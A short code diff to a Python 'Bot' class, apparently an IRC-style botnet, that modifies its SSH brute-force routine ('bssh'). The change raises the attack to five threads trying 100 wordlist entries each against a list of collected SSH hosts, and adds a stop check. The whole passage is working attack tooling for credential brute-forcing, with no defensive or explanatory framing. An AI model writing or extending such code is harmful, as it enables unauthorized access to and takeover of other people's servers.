@@ -317,10 +317,12 @@ class Bot:
 			keys = web_file.readlines()
 			self.printayne('collected {0} running SSHs # wordlist contains {1} keys'.format(len(sshs), len(keys)), [place])
 			for ssh in sshs:
+				if not self.job_running('bssh'):
+					return
 				self.printayne('bssh now bruting {0}'.format(ssh), [place])
 				ts = []
-				for i in range(4):
-					t = Thread(target=self.bssh_r, args=(ssh.strip('\r\n'), keys[i*5:i*5+5], place,))
+				for i in range(5):
+					t = Thread(target=self.bssh_r, args=(ssh.strip('\r\n'), keys[i*100:i*100+100], place,))
 					self.add_jobs('bssh', [t])
 					t.start()
 					ts.append(t)
